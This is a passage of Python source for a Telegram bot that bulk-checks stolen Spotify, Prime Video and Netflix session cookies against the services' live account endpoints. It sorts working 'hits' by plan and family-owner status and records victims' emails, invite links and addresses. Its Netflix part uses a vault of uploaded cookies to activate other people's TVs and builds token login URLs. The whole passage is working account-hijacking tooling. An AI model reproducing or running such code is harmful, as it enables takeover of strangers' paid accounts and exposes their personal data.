                    data["email"] = str(profile_email)
            except:
                pass
    except:
        pass

    family_home_url = "https://www.spotify.com/api/family/v1/family/home"
    try:
        family_resp = session.get(
            family_home_url,
            headers=profile_headers,
            proxies=proxy,
            timeout=20,
            allow_redirects=False
        )
        if family_resp.status_code == 200:
            try:
                family_json = family_resp.json()
                data = spotify_enrich_family_data_from_home_api(data, family_json)
            except:
                pass
    except:
        pass

    manage_url_candidates = [
        "https://www.spotify.com/us/account/subscription/manage/",
        "https://www.spotify.com/account/subscription/manage/"
    ]
    for manage_url in manage_url_candidates:
        try:
            manage_resp = session.get(
                manage_url,
                headers=overview_headers,
                proxies=proxy,
                timeout=20,
                allow_redirects=True
            )
            if manage_resp.status_code == 200 and manage_resp.text:
                if spotify_is_external_billing_managed(manage_resp.text):
                    data["autopayStatus"] = "Unknown"
                    data.pop("nextPaymentDate", None)
                    break
                next_payment_date = spotify_parse_next_payment_date_from_html(manage_resp.text)
                if next_payment_date is not None:
                    data["isRecurring"] = True
                    data["nextPaymentDate"] = next_payment_date.isoformat()
                    data["autopayStatus"] = "True"
                    break
        except:
            pass

    return data, 200

def spotify_random_number_string(length=8):
    return ''.join(random.choices(string.digits, k=length))

def spotify_convert_json_to_netscape(json_data: list) -> str:
    netscape_lines = []
    for cookie in json_data:
        domain = cookie.get('domain', '')
        tail_match = "TRUE" if domain.startswith('.') else "FALSE"
        path = cookie.get('path', '/')
        secure = "TRUE" if cookie.get('secure', False) else "FALSE"
        expires = str(cookie.get('expirationDate', 0))
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        netscape_lines.append(line)
    return '\n'.join(netscape_lines)

def spotify_is_netscape_cookie_line(line: str) -> bool:
    parts = line.strip().split('\t')
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True

def spotify_normalize_netscape_cookie_text(raw_text: str) -> str:
    clean_lines = []
    for line in raw_text.splitlines():
        if spotify_is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return '\n'.join(clean_lines)

def spotify_cookies_dict_from_netscape(netscape_text: str) -> dict:
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    return cookies

def spotify_is_family_owner_with_slots(data: dict) -> bool:
    plan = data.get("currentPlan", "unknown")
    is_owner = data.get("isSubAccount") is False
    free_slots = data.get("freeSlots")
    return plan in ("family_premium_v2", "family_basic") and is_owner and isinstance(free_slots, int) and free_slots > 0

def spotify_generate_filename(country: str, plan_name: str) -> str:
    safe_plan = plan_name.replace(' ', '-').replace('_', '-')
    safe_country = country.replace(' ', '-').replace('_', '-')
    randnum = spotify_random_number_string()
    return f"{safe_country}_github-harshitkamboj_{safe_plan}_{randnum}.txt"

def spotify_format_cookie_file(data: dict, cookie_content: str, config: dict) -> str:
    txt_fields = config.get("txt_fields", {})
    lines = []
    plan = spotify_plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    email = data.get("email", "")
    owner = "True" if data.get("isSubAccount") is False else "False"
    free_slots = data.get("freeSlots")
    invite_link = data.get("inviteLink", "")
    address = data.get("address", "")
    next_payment_iso = data.get("nextPaymentDate", "")
    autopay_status = data.get("autopayStatus", "")
    is_family_or_duo = data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium")
    is_family_owner = data.get("currentPlan") in ("family_premium_v2", "family_basic") and data.get("isSubAccount") is False

    if txt_fields.get("plan", True):
        lines.append(f"Plan: {plan}")
    if txt_fields.get("email", True):
        lines.append(f"Email: {email}")
    if txt_fields.get("country", True):
        lines.append(f"Country: {country}")
    if str(autopay_status).lower() == "unknown":
        lines.append("Autopay: Unknown")
    if str(autopay_status).lower() != "unknown" and data.get("isRecurring", False) and next_payment_iso:
        try:
            payment_date = datetime.strptime(next_payment_iso, "%Y-%m-%d").date()
            days_left = (payment_date - datetime.now().date()).days
            payment_text = f"{days_left} Days | {payment_date.day} {payment_date.strftime('%b %Y')}"
            lines.append(f"Next Payment: {payment_text}")
        except:
            pass
    if txt_fields.get("owner", True) and is_family_or_duo:
        lines.append(f"Owner: {owner}")
    if data.get("isChildAccount") is True:
        lines.append("Child Account: True")
    if txt_fields.get("free_slots", True) and is_family_owner:
        lines.append(f"Free Slots: {free_slots if isinstance(free_slots, int) else 'unknown'}")
    if txt_fields.get("invite_link", True) and is_family_owner and invite_link:
        lines.append(f"Invite link: {invite_link}")
    if txt_fields.get("address", True) and is_family_owner and address:
        lines.append(f"Address: {address}")

    lines.append("")
    lines.append("Checker By: github.com/harshitkamboj | Website: harshitkamboj.in")
    lines.append("Spotify COOKIE :👇")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)

def spotify_process_single_cookie(content: str, seen_emails: Set[str], config: dict) -> Tuple[str, Optional[dict], Optional[str], Optional[str]]:
    try:
        try:
            cookies_json = json.loads(content)
            netscape_content = spotify_convert_json_to_netscape(cookies_json)
            netscape_content = spotify_normalize_netscape_cookie_text(netscape_content)
            cookies = spotify_cookies_dict_from_netscape(netscape_content)
        except:
            netscape_content = spotify_normalize_netscape_cookie_text(content)
            cookies = spotify_cookies_dict_from_netscape(netscape_content)

        session = requests.Session()
        session.cookies.update(cookies)
        session.headers.update({'Accept-Encoding': 'identity'})

        data, status_code = spotify_get_account_data_from_new_api(session, proxy=None)
        if status_code != 200 or not data:
            return "failed", None, None, None

        current_plan = data.get("currentPlan", "unknown")
        email_key = str(data.get("email", "")).strip().lower()

        if email_key:
            if email_key in seen_emails:
                return "duplicate", None, None, None
            else:
                seen_emails.add(email_key)

        if current_plan == "free":
            status = "free"
        else:
            status = "success"

        output_text = spotify_format_cookie_file(data, netscape_content, config)
        plan_display = spotify_plan_name_mapping(current_plan)
        country = data.get("country", "unknown")
        filename = spotify_generate_filename(country, plan_display)
        return status, data, output_text, filename

    except Exception:
        return "error", None, None, None

def spotify_process_zip_bytes(zip_bytes: bytes, config: dict) -> Tuple[bytes, str]:
    seen_emails = set()
    stats = {
        'success': 0,
        'free': 0,
        'failed': 0,
        'duplicate': 0,
        'error': 0,
        'total': 0
    }

    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            zip_input = io.BytesIO(zip_bytes)
            with zipfile.ZipFile(zip_input, 'r') as zf:
                zf.extractall(tmpdir)
        except:
            return io.BytesIO(b"Invalid ZIP").getvalue(), "❌ Could not extract ZIP file."

        output_root = os.path.join(tmpdir, "output")
        folders = ["hits", "free", "failed", "broken", "duplicate"]
        for folder in folders:
            os.makedirs(os.path.join(output_root, folder), exist_ok=True)

        for root, dirs, files in os.walk(tmpdir):
            if root.startswith(output_root):
                continue
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                except:
                    continue

                status, data, output_text, filename = spotify_process_single_cookie(content, seen_emails, config)
                stats['total'] += 1

                if status == 'success':
                    stats['success'] += 1
                    plan = data.get('currentPlan', 'unknown')
                    is_sub = data.get('isSubAccount')
                    if plan in ("family_premium_v2", "duo_premium", "family_basic"):
                        if is_sub is False:
                            subfolder = "owner_account"
                        elif is_sub is True:
                            subfolder = "non_owner_account"
                        else:
                            subfolder = "unknown"
                        dest_folder = os.path.join(output_root, "hits", spotify_plan_name_mapping(plan), subfolder)
                    else:
                        dest_folder = os.path.join(output_root, "hits", spotify_plan_name_mapping(plan))
                    os.makedirs(dest_folder, exist_ok=True)
                    out_path = os.path.join(dest_folder, filename)
                    with open(out_path, 'w', encoding='utf-8') as f:
                        f.write(output_text)

                elif status == 'free':
                    stats['free'] += 1
                    plan = data.get('currentPlan', 'unknown')
                    dest_folder = os.path.join(output_root, "free", spotify_plan_name_mapping(plan))
                    os.makedirs(dest_folder, exist_ok=True)
                    out_path = os.path.join(dest_folder, filename)
                    with open(out_path, 'w', encoding='utf-8') as f:
                        f.write(output_text)

                elif status == 'failed':
                    stats['failed'] += 1
                    shutil.copy(file_path, os.path.join(output_root, "failed", file))

                elif status == 'duplicate':
                    stats['duplicate'] += 1
                    shutil.copy(file_path, os.path.join(output_root, "duplicate", file))

                elif status == 'error':
                    stats['error'] += 1
                    shutil.copy(file_path, os.path.join(output_root, "broken", file))

        zip_output = io.BytesIO()
        with zipfile.ZipFile(zip_output, 'w', zipfile.ZIP_DEFLATED) as zf_out:
            for root, dirs, files in os.walk(output_root):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, output_root)
                    zf_out.write(file_path, arcname)

        zip_output.seek(0)
        summary = (
            f"✅ Checked {stats['total']} cookies.\n"
            f"  • Hits: {stats['success']}\n"
            f"  • Free: {stats['free']}\n"
            f"  • Failed: {stats['failed']}\n"
            f"  • Duplicate: {stats['duplicate']}\n"
            f"  • Errors: {stats['error']}"
        )
        return zip_output.getvalue(), summary

async def process_spotify_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Spotify ZIP file"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    document = update.message.document
    if not document.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Please send a ZIP file.")
        return
    
    progress_msg = await update.message.reply_text("📥 Downloading your ZIP file...")
    file = await document.get_file()
    zip_bytes = await file.download_as_bytearray()
    
    await progress_msg.edit_text("🔄 Processing Spotify cookies...")
    
    try:
        config = copy.deepcopy(SPOTIFY_DEFAULT_CONFIG)
        output_zip_bytes, summary = await asyncio.to_thread(
            spotify_process_zip_bytes, 
            zip_bytes, 
            config
        )
        
        await progress_msg.edit_text(summary)
        
        await update.message.reply_document(
            document=io.BytesIO(output_zip_bytes),
            filename="spotify_results.zip",
            caption=f"🎵 Spotify Results\n{WATERMARK}"
        )
        
    except Exception as e:
        await progress_msg.edit_text(f"❌ Error processing: {str(e)}")

# ==================== TELEGRAM BOT HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check force-join first
    if not await force_join_gate(update, context):
        return
    
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await update.message.reply_html("⚠️ Already processing. Please stop first.", reply_markup=STOP_MARKUP)
            return
        user_state[user_id] = {'mode': 'netflix', 'platform': 'netflix', 'cookies': [], 'stop': False, 'busy': False}
        await update.message.reply_html(START_MSG, reply_markup=PLATFORM_MARKUP)

async def platform_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if query.data == "platform_netflix":
        async with user_locks[user_id]:
            user_state[user_id]['platform'] = 'netflix'
            user_state[user_id]['mode'] = 'netflix'
        await query.message.edit_text(
            "<b>🎬 Netflix Mode Selected</b>\n\nChoose an action:",
            parse_mode='HTML', reply_markup=NETFLIX_MARKUP)
    elif query.data == "platform_prime":
        async with user_locks[user_id]:
            user_state[user_id]['platform'] = 'prime'
            user_state[user_id]['mode'] = 'prime_check'
        await query.message.edit_text(
            "<b>📺 Prime Video Mode Selected</b>\n\nSend me a ZIP file containing your Prime Video cookies.\n"
            "The ZIP should contain .txt or .json cookie files.",
            parse_mode='HTML', reply_markup=PRIME_MARKUP)
    elif query.data == "platform_spotify":
        async with user_locks[user_id]:
            user_state[user_id]['platform'] = 'spotify'
            user_state[user_id]['mode'] = 'spotify_check'
        await query.message.edit_text(
            "<b>🎵 Spotify Mode Selected</b>\n\nSend me a ZIP file containing your Spotify cookie files.\n"
            "The ZIP should contain .txt or .json cookie files.",
            parse_mode='HTML', reply_markup=SPOTIFY_MARKUP)
    elif query.data == "back_platform":
        await query.message.edit_text(START_MSG, parse_mode='HTML', reply_markup=PLATFORM_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already processing!")
            return
        
        modes = {
            "mode_check": ("check", "🔍 Account Check mode! Upload file."),
            "mode_nftoken": ("nftoken", "🔑 NF Token mode! Upload file."),
            "mode_clean": ("clean", "🧹 Clean Cookies mode! Upload messy file."),
            "mode_tvlogin": ("tvlogin", None),
        }
        
        if query.data in modes:
            mode, msg = modes[query.data]
            user_state[user_id]['mode'] = mode
            user_state[user_id]['cookies'] = []
            user_state[user_id]['stop'] = False
            user_state[user_id]['busy'] = False
            
            if mode == "tvlogin":
                await query.answer("📺 Free TV Login activated!")
                await context.bot.send_message(chat_id,
                    "<b>📺 Free TV Login</b>\n\n"
                    "1. Open Netflix on your TV\n"
                    "2. Get the 8-digit code from screen\n"
                    "3. Send: <code>/tv YOUR_CODE</code>\n\n"
                    f"🍪 Cookies in vault: <b>{count_vault_cookies()}</b>",
                    parse_mode='HTML')
            else:
                await query.answer(msg)
                await context.bot.send_message(chat_id, f"<b>{msg}</b>\n\nUpload your .txt/.json/.zip file.", parse_mode='HTML')
        
        elif query.data == "prime_check":
            user_state[user_id]['mode'] = 'prime_check'
            user_state[user_id]['cookies'] = []
            user_state[user_id]['stop'] = False
            user_state[user_id]['busy'] = False
            await query.answer("📺 Prime Check mode!")
            await context.bot.send_message(chat_id,
                "<b>📺 Prime Video Check</b>\n\n"
                "Upload a ZIP file containing your Prime Video cookies.\n"
                "The ZIP should contain .txt or .json cookie files.",
                parse_mode='HTML')
        
        elif query.data == "spotify_check":
            user_state[user_id]['mode'] = 'spotify_check'
            user_state[user_id]['cookies'] = []
            user_state[user_id]['stop'] = False
            user_state[user_id]['busy'] = False
            await query.answer("🎵 Spotify Check mode!")
            await context.bot.send_message(chat_id,
                "<b>🎵 Spotify Check</b>\n\n"
                "Upload a ZIP file containing your Spotify cookie files.\n"
                "The ZIP should contain .txt or .json cookie files.",
                parse_mode='HTML')

async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /tv command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id
    
    # Check force-join
    if not await force_join_gate(update, context):
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Usage: <code>/tv 12345678</code>\n\nGet the 8-digit code from your TV screen.",
            parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.message.reply_text("❌ TV code must be exactly 8 digits!", parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    vault_count = count_vault_cookies()
    if vault_count == 0:
        await update.message.reply_text("😔 <b>No cookies in vault!</b>\n\nAdmin needs to upload cookies using /upload command.", 
                                       parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 <b>Starting TV login...</b>\n📺 Code: <code>{tv_code}</code>\n🍪 Vault: <b>{vault_count}</b> cookies\n\nSearching for working cookie...",
        parse_mode='HTML', reply_to_message_id=msg_id)
    
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate_message(context, chat_id, status_msg.message_id, stop_anim))
    
    result = await asyncio.to_thread(process_tv_login, tv_code)
    
    stop_anim.set()
    await asyncio.sleep(0.3)
    
    with tv_stats_lock:
        tv_stats["total_logins"] += 1
        if result["success"]:
            tv_stats["successful"] += 1
            resp = (f"✅ <b>TV ACTIVATED SUCCESSFULLY!</b>\n\n"
                   f"📺 Code: <code>{tv_code}</code>\n"
                   f"🌍 Country: <b>{result.get('country', 'N/A')}</b>\n"
                   f"📦 Plan: <b>{result.get('plan', 'N/A')}</b>\n\n"
                   f"<i>Your TV is now ready to watch Netflix!</i> 🍿\n\n"
                   f"🍪 Remaining in vault: <b>{count_vault_cookies()}</b>")
        elif result.get("error") == "no_cookies_left":
            tv_stats["failed"] += 1
            resp = "😔 <b>All cookies exhausted!</b>\n\nNo more cookies in vault. Wait for admin to upload more."
        elif result.get("error") == "all_cookies_failed":
            tv_stats["failed"] += 1
            tried = result.get('tried_countries', [])
            resp = (f"❌ <b>All cookies failed!</b>\n\n"
                   f"Tried {len(tried)} cookies\n"
                   f"Countries: {', '.join(set(tried)) if tried else 'N/A'}\n\n"
                   f"Vault is now empty. Admin needs to upload more cookies.")
        elif "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
            tv_stats["codes_rejected"] += 1
            resp = (f"❌ <b>Invalid or Expired TV Code</b>\n\n"
                   f"📺 Code: <code>{tv_code}</code>\n"
                   f"🌍 Cookie country: <b>{result.get('country', 'N/A')}</b>\n\n"
                   f"<i>Please check your TV screen and get a fresh code.\n"
                   f"TV codes expire quickly!</i>")
        else:
            tv_stats["codes_rejected"] += 1
            resp = (f"❌ <b>Activation Failed</b>\n\n"
                   f"📺 Code: <code>{tv_code}</code>\n"
                   f"🌍 Cookie: <b>{result.get('country', 'N/A')}</b>\n"
                   f"⚠️ {result.get('error', 'Unknown error')}\n\n"
                   f"<i>Try again with a fresh TV code.</i>")
    
    await status_msg.edit_text(resp, parse_mode='HTML')

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Upload cookies to vault"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only!")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("📎 Reply to a ZIP file with <code>/upload</code>", parse_mode='HTML')
        return
    
    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Only .zip files accepted!")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading...")
    
    try:
        file = await context.bot.get_file(doc.file_id)
        zip_bytes = await file.download_as_bytearray()
        await status_msg.edit_text("📂 Extracting cookies...")
        
        os.makedirs(COOKIES_DIR, exist_ok=True)
        added, skipped = 0, 0
        
        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
                    continue
                if not name.lower().endswith(('.txt', '.json')):
                    skipped += 1
                    continue
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cookies = extract_cookie_dict_tv(content)
                    if not cookies or not cookies.get('NetflixId'):
                        skipped += 1
                        continue
                    
                    base = os.path.basename(name)
                    safe = re.sub(r'[<>:"/\\|?*]', '_', base)
                    dest = os.path.join(COOKIES_DIR, safe)
                    if os.path.exists(dest):
                        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                        n, e = os.path.splitext(safe)
                        dest = os.path.join(COOKIES_DIR, f"{n}_{suf}{e}")
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(content)
                    added += 1
                except:
                    skipped += 1
        
        await status_msg.edit_text(
            f"✅ <b>Upload complete!</b>\n\n"
            f"📥 Added: <b>{added}</b> cookies\n"
            f"⏭️ Skipped: <b>{skipped}</b>\n"
            f"🍪 Total in vault: <b>{count_vault_cookies()}</b>",
            parse_mode='HTML')
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin stats - ALL TIME"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only!")
        return
    
    with tv_stats_lock:
        msg = (f"📊 <b>TV Login Stats (All Time)</b>\n\n"
               f"🍪 Vault: <b>{count_vault_cookies()}</b>\n"
               f"🎬 Total attempts: <b>{tv_stats['total_logins']}</b>\n"
               f"✅ Successful: <b>{tv_stats['successful']}</b>\n"
               f"❌ Failed (dead cookies): <b>{tv_stats['failed']}</b>\n"
               f"🚫 Invalid codes: <b>{tv_stats['codes_rejected']}</b>\n"
               f"⏰ Started: {tv_stats['started_at']}")
    await update.message.reply_text(msg, parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    
    user_id = update.effective_user.id
    
    # Check force-join
    if not await force_join_gate(update, context):
        return
    
    async with user_locks[user_id]:
        if user_id not in user_state:
            user_state[user_id] = {'platform': 'netflix', 'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        
        if user_state[user_id].get('busy'):
            await update.message.reply_html("⚠️ Already processing. Stop first.", reply_markup=STOP_MARKUP)
            return
        
        platform = user_state[user_id].get('platform', 'netflix')
        mode = user_state[user_id].get('mode', 'check')
        
        doc = update.message.document
        file_name = doc.file_name.lower()
        
        # Spotify mode
        if platform == 'spotify' or mode == 'spotify_check':
            if not file_name.endswith('.zip'):
                await update.message.reply_text("❌ Please send a ZIP file containing your Spotify cookies.")
                return
            await process_spotify_zip(update, context)
            return
        
        # Prime Video mode - handle ZIP files
        if platform == 'prime' or mode == 'prime_check':
            if not file_name.endswith('.zip'):
                await update.message.reply_text("❌ Please send a ZIP file containing your Prime Video cookies.")
                return
            
            # Process Prime Video ZIP
            await process_prime_zip(update, context)
            return
        
        # Netflix modes - handle .txt, .json, .zip
        file = await doc.get_file()
        ext = file_name
        
        with tempfile.TemporaryDirectory() as td:
            tp = os.path.join(td, doc.file_name)
            await file.download_to_drive(tp)
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            if mode == "clean":
                await clean_cookies_process(update.effective_chat.id, content, user_id, context, doc.file_name)
                return
            
            cookies = []
            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(tp)
            else:
                c = parse_cookie_file(content)
                for idx, (bn, cc) in enumerate(c):
                    if cc.get('NetflixId'):  
                        cookies.append((f"{safe_filename(doc.file_name)}_{idx}", cc))
            
            seen = set()
            dedup = []
            for nm, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((nm, ck))
            
            if not dedup:
                await update.message.reply_text("❌ No valid Netflix cookies found in file!")
                return
            
            user_state[user_id]['cookies'] = dedup
            mode_text = {"check": "Account Check", "nftoken": "NFToken Generation"}.get(mode, mode)
            await update.message.reply_html(
                f"✅ Loaded <b>{len(dedup)}</b> unique cookies!\nMode: <b>{mode_text}</b>\n\nPress below to start.",
                reply_markup=CHECK_MARKUP)

async def process_prime_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Prime Video ZIP file"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    document = update.message.document
    if not document.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Please send a ZIP file.")
        return
    
    progress_msg = await update.message.reply_text("📥 Downloading your ZIP file...")
    file = await document.get_file()
    zip_path = os.path.join(tempfile.gettempdir(), f"{user_id}_{document.file_name}")
    await file.download_to_drive(zip_path)

    # Extract to temp directory
    extract_dir = os.path.join(tempfile.gettempdir(), f"prime_bot_{user_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}")
    os.makedirs(extract_dir, exist_ok=True)
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
    except Exception as e:
        await progress_msg.edit_text(f"❌ Error extracting ZIP: {str(e)}")
        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(zip_path)
        return

    # Find cookie files
    cookie_files = []
    for root, _, files in os.walk(extract_dir):
        for f in files:
            if f.lower().endswith(('.txt', '.json')):
                src = os.path.join(root, f)
                cookie_files.append(src)

    if not cookie_files:
        await progress_msg.edit_text("❌ No .txt or .json cookie files found in the ZIP.")
        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(zip_path)
        return

    await progress_msg.edit_text(f"✅ Found {len(cookie_files)} cookie files. Starting Prime check...")

    # Progress callback for async updates
    async def progress_callback_async(total, processed, counts, paid_counts):
        if processed % 5 == 0 or processed == total:
            text = (
                f"🔄 Progress: {processed}/{total} cookies checked\n"
                f"✅ Valid (Paid): {counts['hits']}\n"
                f"🆓 Free: {counts['free']}\n"
                f"❌ Invalid: {counts['bad']}\n"
                f"🔄 Duplicate: {counts['duplicate']}\n"
                f"⚠️ Errors: {counts['errors']}"
            )
            await progress_msg.edit_text(text)

    # Run check in thread with async callback
    def run_check():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        def sync_progress(total, processed, counts, paid_counts):
            asyncio.run_coroutine_threadsafe(
                progress_callback_async(total, processed, counts, paid_counts),
                loop
            )
        
        return prime_check_cookies_sync(
            cookie_files=cookie_files,
            base_path=extract_dir,
            progress_callback=sync_progress
        )

    try:
        # Run in a separate thread
        counts, paid_counts = await asyncio.to_thread(run_check)
    except Exception as e:
        await progress_msg.edit_text(f"❌ Error during checking: {str(e)}")
        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(zip_path)
        return

    # Zip results
    output_zip_path = os.path.join(tempfile.gettempdir(), f"prime_results_{user_id}.zip")
    with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(extract_dir):
            for f in files:
                full_path = os.path.join(root, f)
                arcname = os.path.relpath(full_path, extract_dir)
                zf.write(full_path, arcname)

    # Send results
    summary = (
        f"✅ Prime checking completed!\n"
        f"📊 Total cookies: {len(cookie_files)}\n"
        f"✅ Valid (Paid): {counts['hits']}\n"
        f"🆓 Free: {counts['free']}\n"
        f"❌ Invalid: {counts['bad']}\n"
        f"🔄 Duplicate: {counts['duplicate']}\n"
        f"⚠️ Errors: {counts['errors']}\n"
        f"📦 Download your results ZIP below."
    )
    await progress_msg.edit_text(summary)

    with open(output_zip_path, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename="prime_results.zip",
            caption=f"📺 Prime Video Results\n{WATERMARK}"
        )

    # Cleanup
    shutil.rmtree(extract_dir, ignore_errors=True)
    os.remove(zip_path)
    os.remove(output_zip_path)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies', [])
        if not cookies:
            await query.answer("No cookies! Upload first.")
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already running!")
            return
        
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        mode = user_state[user_id].get('mode', 'check')
        
        user_tasks[user_id] = context.application.create_task(
            process_cookies(chat_id, cookies, user_id, context, mode))
        await query.answer(f"Started checking {len(cookies)} cookies!")

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = True
        await query.answer("Stopped!")

async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits') or user_state.get(user_id, {}).get('live_hits', OrderedDict())
    if not hits:
        await query.answer("No hits yet!")
        return
    mode = user_state[user_id].get('mode', 'check')
    all_c = []
    for idx, (nm, dd) in enumerate(hits.items(), 1):
        if mode == 'nftoken':
            ti = dd.get('token_info', {})
            all_c.append(f"TOKEN #{idx}\nToken: {ti.get('token','')}\nExpires: {ti.get('expires','')}\n\nPhone: https://www.netflix.com/unsupported?nftoken={ti.get('token','')}\nDesktop: https://www.netflix.com/browse?nftoken={ti.get('token','')}")
        else:
            all_c.append(build_export_str(dd, idx))
    buf = io.BytesIO(("\n\n".join(all_c)).encode("utf-8"))
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename=f"Current_Hits_{len(hits)}.txt"), 
                                   caption=f"📋 {len(hits)} hits found so far")
    await query.answer(f"Sent {len(hits)} hits!")

async def clean_cookies_process(chat_id, content, user_id, context, filename):
    progress_msg = await context.bot.send_message(chat_id, 
        "<b>🧹 Cleaning Cookies</b>\n<code>○○○○○</code>  Analyzing...", parse_mode='HTML')
    
    try:
        parsed = parse_cookie_file(content)
        await progress_msg.edit_text(
            f"<b>🧹 Cleaning Cookies</b>\n<code>●●○○○</code>  Found {len(parsed)} cookie sets...", parse_mode='HTML')
        
        if not parsed:
            await progress_msg.edit_text("<b>🧹 Cleaning Cookies</b>\n<code>○○○○○</code>  ❌ No Netflix cookies found!", parse_mode='HTML')
            return
        
        seen = set()
        unique = []
        for name, cd in parsed:
            h = hashlib.sha256(json.dumps(cd, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h)
                unique.append((name, cd))
        
        await progress_msg.edit_text(
            f"<b>🧹 Cleaning Cookies</b>\n<code>●●●○○</code>  {len(unique)} unique, creating files...", parse_mode='HTML')
        
        zip_buffer = io.BytesIO()
        valid = 0
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, (_, cd) in enumerate(unique, 1):
                if cd.get('NetflixId'):
                    valid += 1
                    expiry = int(time.time()) + 180 * 24 * 3600
                    lines = ["# Netscape HTTP Cookie File"]
                    for n, v in cd.items():
                        domain = ".netflix.com"
                        secure = "TRUE" if n == "SecureNetflixId" else "FALSE"
                        lines.append(f"{domain}\tTRUE\t/\t{secure}\t{expiry}\t{n}\t{v}")
                    zf.writestr(f"Netflix_Cookie_{idx}.txt", "\n".join(lines))
        
        await progress_msg.edit_text(
            f"<b>🧹 Cleaning Cookies</b>\n<code>●●●●●</code>  Done! {valid} valid", parse_mode='HTML')
        
        if valid > 0:
            zip_buffer.seek(0)
            await context.bot.send_document(chat_id,
                document=InputFile(zip_buffer, filename=f"Cleaned_{safe_filename(filename or 'cookies')}.zip"),
